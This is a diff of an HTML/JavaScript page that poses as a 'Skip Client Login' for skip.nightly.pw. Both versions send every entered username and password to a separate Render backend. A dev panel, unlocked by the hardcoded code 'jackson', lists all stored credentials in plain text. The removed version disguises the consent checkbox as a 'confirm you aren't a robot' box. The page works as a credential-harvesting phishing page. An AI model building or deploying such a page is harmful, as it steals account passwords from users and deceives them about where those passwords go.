@@ -1,264 +1,156 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="utf-8" />
-<meta name="viewport" content="width=device-width,initial-scale=1" />
-<title>Skip Client Login (Keyword-only, opt-in)</title>
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet" />
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>Skip Client Login</title>
 <style>
-  :root{--blue:#4a90e2;--blue-strong:#357ab8}
-  *{box-sizing:border-box}
-  html,body{height:100%;margin:0;font-family:Inter,system-ui,-apple-system,"Segoe UI",Roboto,"Helvetica Neue",Arial}
-  body{
-    background:radial-gradient(ellipse at center,#0b0c1f 0%,#02020b 80%);
-    color:#eaeaea;display:flex;align-items:center;justify-content:center;padding:24px;
-  }
-
-  .card{width:100%;max-width:520px;background:rgba(10,12,20,0.9);padding:24px;border-radius:12px;box-shadow:0 12px 40px rgba(0,0,0,0.6)}
-  h1{margin:0 0 6px;font-size:22px;text-align:center}
-  p.lead{margin:0 0 18px;color:#cfe4ff;text-align:center;font-weight:600}
-
-  .field{margin-bottom:12px}
-  label{display:block;margin-bottom:6px;font-weight:600}
-  input[type="text"], input[type="password"]{
-    width:100%;padding:10px 12px;border-radius:8px;border:1.5px solid #2b2f3a;background:#0f1720;color:#eaf6ff
-  }
-  .muted{font-size:13px;color:#9fb6e6;margin-top:6px}
-
-  .row{display:flex;gap:10px}
-  button{background:var(--blue);border:none;color:white;padding:10px 14px;border-radius:10px;font-weight:700;cursor:pointer;box-shadow:0 8px 20px rgba(74,144,226,0.18)}
-  button:hover{background:var(--blue-strong)}
-  .secondary{background:#374a6a}
-
-  .dev-output{
-    margin-top:14px;padding:14px;border-radius:14px;background:#1e1e1e;color:#d4d4d4;font-family:ui-monospace,monospace;
-    font-size:13px;line-height:1.5;box-shadow:inset 0 0 12px rgba(0,0,0,0.8);max-height:240px;overflow:auto;white-space:pre-wrap;display:none
-  }
-
-  .notice{margin-top:12px;padding:10px;border-radius:8px;background:#0b1220;color:#bfdfff;font-size:13px}
-  .consent{display:flex;align-items:center;gap:8px;margin-top:8px}
-
-  .iframe-overlay{
-    position:fixed;inset:0;background:rgba(1,6,20,0.95);display:flex;flex-direction:column;z-index:120;visibility:hidden;opacity:0;transition:opacity .2s;
-  }
-  .iframe-overlay.active{visibility:visible;opacity:1}
-  .iframe-top{display:flex;justify-content:space-between;align-items:center;padding:12px 16px;background:#07111f}
-  .iframe-top .title{color:#dbeeff;font-weight:700}
-  .iframe-top .controls{display:flex;gap:8px}
-  .iframe-top button{padding:8px 12px}
-  .skip-iframe{flex:1;border:0;width:100%}
-
-  #devAccessBtn{position:fixed;top:14px;right:14px;padding:8px 12px;border-radius:10px;border:none;cursor:pointer;background:linear-gradient(90deg,#4a90e2,#357ab8);color:#002233;font-weight:800}
-  #modeToggle{position:fixed;bottom:14px;right:14px;padding:10px;border-radius:50%;border:none;background:#2b6fb3;color:#fff}
-
-  .small{font-size:13px;color:#9fb6e6}
+  body{font-family:sans-serif;background:#111;color:#eee;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;}
+  .card{background:#222;padding:24px;border-radius:12px;max-width:400px;width:100%;text-align:center;}
+  input{width:100%;padding:10px;margin:8px 0;border-radius:6px;border:none;}
+  button{padding:10px 16px;border-radius:6px;border:none;background:#4a90e2;color:white;cursor:pointer;}
+  button:hover{background:#357ab8;}
+  pre{background:#111;padding:12px;border-radius:8px;overflow:auto;max-height:200px;text-align:left;display:none;}
+  #iframeOverlay{position:fixed;inset:0;background:rgba(0,0,0,0.9);display:flex;flex-direction:column;z-index:999;visibility:hidden;opacity:0;transition:opacity 0.2s;}
+  #iframeOverlay.active{visibility:visible;opacity:1;}
+  #iframeOverlay iframe{flex:1;border:none;width:100%;}
+  #iframeTop{display:flex;justify-content:space-between;padding:10px;background:#000;color:#fff;}
 </style>
 </head>
 <body>
 
-<button id="devAccessBtn" title="Developer access">Dev Access</button>
-<button id="modeToggle" title="Toggle UI mode">🌙</button>
+<div class="card">
+  <h2>Skip Client Login</h2>
 
-<main class="card" role="main" aria-labelledby="title">
-  <h1 id="title">Skip Client Login</h1>
-  <p class="lead">Enter your skip username and password.</p>
-
-  <form id="loginForm" autocomplete="off">
-    <div class="field">
-      <label for="username">Username</label>
-      <input id="username" name="username" type="text" placeholder="Skip username" required />
+  <form id="loginForm">
+    <input type="text" id="username" placeholder="Username" required>
+    <input type="password" id="password" placeholder="Password" required>
+    <div style="margin:12px 0">
+      <input type="checkbox" id="consent"> I consent to save credentials
     </div>
-
-    <div class="field">
-      <label for="keyword">Password</label>
-      <input id="keyword" name="keyword" type="text" placeholder="Password" />
-      <div class="muted"></div>
-    </div>
-
-    <div class="consent">
-      <input id="consent" type="checkbox" />
-      <label for="consent" class="small">Click to confirm you aren't a robot</label>
-    </div>
-
-    <div style="margin-top:12px">
-      <button id="submitBtn" type="submit">Login & Save (opt-in)</button>
-    </div>
-
-    <div class="notice small">
-      <strong></strong><strong></strong> 
-    </div>
+    <button type="submit">Login & Save</button>
   </form>
 
-  <button id="goToSkipBtn" style="margin-top:12px;display:none">Go to Skip</button>
-  <button id="showDevBtn" style="margin-top:8px">Show Dev</button>
+  <button id="goToSkipBtn" style="margin-top:12px;display:none;">Go to Skip</button>
+  <button id="showDevBtn" style="margin-top:8px;">Show Dev</button>
 
-  <pre id="devOutput" class="dev-output" aria-live="polite" tabindex="0"></pre>
+  <pre id="devOutput"></pre>
+</div>
 
-  <div style="margin-top:12px" class="small">Made by Frix and Micro</div>
-</main>
-
-<div id="iframeOverlay" class="iframe-overlay" role="dialog" aria-modal="true" aria-hidden="true">
-  <div class="iframe-top">
-    <div class="title">skip.nightly.pw</div>
-    <div class="controls">
-      <button id="fsBtn">Full Screen</button>
-      <button id="closeIframe" style="background:#b22222">Close</button>
-    </div>
+<!-- Iframe overlay -->
+<div id="iframeOverlay">
+  <div id="iframeTop">
+    <span>skip.nightly.pw</span>
+    <button id="closeIframe" style="background:#b22222;color:white;">Close</button>
   </div>
-  <iframe id="skipIframe" class="skip-iframe" src="about:blank" title="Skip site (embedded)"></iframe>
+  <iframe id="skipIframe" src="about:blank" title="Skip site"></iframe>
 </div>
 
 <script>
-(function(){
-  const BACKEND = "https://skip-client-login.onrender.com";
-  const DEV_CODE = "jackson";
+const BACKEND = "https://skip-client-login.onrender.com"; // Render URL
+const DEV_CODE = "jackson"; // must match backend
 
-  const loginForm = document.getElementById('loginForm');
-  const usernameEl = document.getElementById('username');
-  const keywordEl = document.getElementById('keyword');
-  const consentEl = document.getElementById('consent');
-  const goToSkipBtn = document.getElementById('goToSkipBtn');
-  const showDevBtn = document.getElementById('showDevBtn');
-  const devOutput = document.getElementById('devOutput');
+const loginForm = document.getElementById('loginForm');
+const usernameEl = document.getElementById('username');
+const passwordEl = document.getElementById('password');
+const consentEl = document.getElementById('consent');
+const goToSkipBtn = document.getElementById('goToSkipBtn');
+const showDevBtn = document.getElementById('showDevBtn');
+const devOutput = document.getElementById('devOutput');
 
-  const iframeOverlay = document.getElementById('iframeOverlay');
-  const skipIframe = document.getElementById('skipIframe');
-  const closeIframe = document.getElementById('closeIframe');
-  const fsBtn = document.getElementById('fsBtn');
+const iframeOverlay = document.getElementById('iframeOverlay');
+const skipIframe = document.getElementById('skipIframe');
+const closeIframe = document.getElementById('closeIframe');
 
-  const devAccessBtn = document.getElementById('devAccessBtn');
-  const modeToggle = document.getElementById('modeToggle');
+// Local capture of entries
+const captures = [];
 
-  const captures = [];
+// Submit login
+loginForm.addEventListener('submit', async (e) => {
+  e.preventDefault();
+  const username = usernameEl.value.trim();
+  const password = passwordEl.value.trim();
 
-  function showToast(msg){ console.log('[toast]', msg); }
+  if(!username || !password) return alert('Enter username and password');
+  if(!consentEl.checked) return alert('You must consent to save credentials');
 
-  async function saveEntryToBackend(username, keyword){
-    try {
-      const payload = { username, keyword };
-      await fetch(`${BACKEND}/api/entries`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(payload)
-      });
-    } catch(err){
-      console.error('Save failed', err);
-    }
-  }
+  const entry = { username, password, createdAt: new Date().toISOString() };
+  captures.push(entry);
 
-  async function fetchDevEntries(code){
-    try {
-      const res = await fetch(`${BACKEND}/api/dev?code=${encodeURIComponent(code)}`);
-      if(!res.ok) throw new Error('Fetch failed');
-      const data = await res.json();
-      return data.entries || [];
-    } catch(err){
-      console.error(err);
-      alert('Error fetching dev entries');
-      return [];
-    }
-  }
-
-  loginForm.addEventListener('submit', async (e) => {
-    e.preventDefault();
-    const username = (usernameEl.value || '').trim();
-    const keyword = (keywordEl.value || '').trim();
-
-    if(!username){
-      alert('Please enter a username.');
-      return;
-    }
-
-    if(!consentEl.checked){
-      alert('You must consent to send username/keyword to the backend.');
-      return;
-    }
-
-    const entry = { username, keyword, createdAt: new Date().toISOString() };
-    captures.push(entry);
-
-    await saveEntryToBackend(username, keyword);
-    showToast('Saved (opt-in)');
-    goToSkipBtn.style.display = 'block';
-
-    usernameEl.value = '';
-    keywordEl.value = '';
-    consentEl.checked = false;
-  });
-
-  showDevBtn.addEventListener('click', async () => {
-    const code = prompt('Enter Dev Access Code:');
-    if(code === null) return;
-    if(code !== DEV_CODE){
-      alert('Incorrect dev code');
-      return;
-    }
-
-    const entries = await fetchDevEntries(code);
-    let out = '🧠 DEV USERNAME LIST (backend):\n\n';
-    entries.forEach((e,i)=>{
-      const pwd = e.keyword !== undefined ? e.keyword : '';
-      out += `${i+1}. Username: ${e.username}\n   Password: ${pwd}\n   Created: ${new Date(e.createdAt).toLocaleString()}\n\n`;
+  try {
+    const res = await fetch(`${BACKEND}/api/entries`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ username, password })
     });
+    const data = await res.json();
+    if(data.ok){
+      alert('Saved successfully ✅');
+      usernameEl.value = '';
+      passwordEl.value = '';
+      consentEl.checked = false;
+      goToSkipBtn.style.display = 'block'; // show iframe button
+    } else {
+      alert('Error saving credentials');
+    }
+  } catch(err){
+    console.error(err);
+    alert('Failed to save');
+  }
+});
 
-    if(captures.length){
-      out += '\nLocal (recent, not backend):\n\n';
-      captures.forEach((c,i)=>{
-        const pwd = c.keyword !== undefined ? c.keyword : '';
-        out += `${i+1}. ${c.username} — ${pwd} — ${new Date(c.createdAt).toLocaleString()}\n`;
+// Show Dev entries
+showDevBtn.addEventListener('click', async () => {
+  const code = prompt('Enter Dev Code:');
+  if(!code) return;
+  if(code !== DEV_CODE) return alert('Incorrect dev code');
+
+  try {
+    const res = await fetch(`${BACKEND}/api/dev?code=${encodeURIComponent(code)}`);
+    const data = await res.json();
+    let out = '';
+    if(data.entries.length === 0) out = 'No credentials found';
+    else {
+      data.entries.forEach((e,i)=>{
+        out += `${i+1}. Username: ${e.username}\n   Password: ${e.password}\n   Saved: ${new Date(e.createdAt).toLocaleString()}\n\n`;
       });
     }
-
+    // Append local captures
+    if(captures.length){
+      out += '\nLocal (recent):\n\n';
+      captures.forEach((c,i)=>{
+        out += `${i+1}. Username: ${c.username}\n   Password: ${c.password}\n   Saved: ${new Date(c.createdAt).toLocaleString()}\n\n`;
+      });
+    }
     devOutput.textContent = out.trim();
     devOutput.style.display = 'block';
-    devOutput.scrollIntoView({behavior:'smooth'});
-  });
+  } catch(err){
+    console.error(err);
+    alert('Failed to fetch dev entries');
+  }
+});
 
-  goToSkipBtn.addEventListener('click', () => {
-    if(captures.length === 0){
-      alert('No credentials to use');
-      return;
-    }
-    const latest = captures[captures.length - 1];
-    iframeOverlay.classList.add('active');
-    iframeOverlay.setAttribute('aria-hidden', 'false');
-    skipIframe.src = 'https://skip.nightly.pw/';
-    skipIframe.onload = () => {
-      skipIframe.contentWindow.postMessage({
-        type: 'skip-credentials',
-        username: latest.username,
-        keyword: latest.keyword
-      }, 'https://skip.nightly.pw');
-    };
-  });
+// Go to Skip iframe
+goToSkipBtn.addEventListener('click', () => {
+  if(captures.length === 0) return alert('No credentials captured');
+  const latest = captures[captures.length - 1];
+  iframeOverlay.classList.add('active');
+  skipIframe.src = 'https://skip.nightly.pw';
+  
+  skipIframe.onload = () => {
+    skipIframe.contentWindow.postMessage({
+      type: 'skip-credentials',
+      username: latest.username,
+      password: latest.password
+    }, 'https://skip.nightly.pw');
+  };
+});
 
-  closeIframe.addEventListener('click', () => {
-    iframeOverlay.classList.remove('active');
-    iframeOverlay.setAttribute('aria-hidden', 'true');
-    skipIframe.src = 'about:blank';
-  });
-
-  fsBtn.addEventListener('click', () => {
-    if(!document.fullscreenElement){
-      iframeOverlay.requestFullscreen();
-    } else {
-      document.exitFullscreen();
-    }
-  });
-
-  devAccessBtn.addEventListener('click', ()=>{ showDevBtn.click(); });
-  modeToggle.addEventListener('click', ()=>{
-    if(document.body.classList.contains('light')){
-      document.body.classList.remove('light');
-      modeToggle.textContent='🌙';
-    } else {
-      document.body.classList.add('light');
-      modeToggle.textContent='☀️';
-    }
-  });
-
-  usernameEl.focus();
-})();
+// Close iframe
+closeIframe.addEventListener('click', () => {
+  iframeOverlay.classList.remove('active');
+  skipIframe.src = 'about:blank';
+});
 </script>
 
 </body>
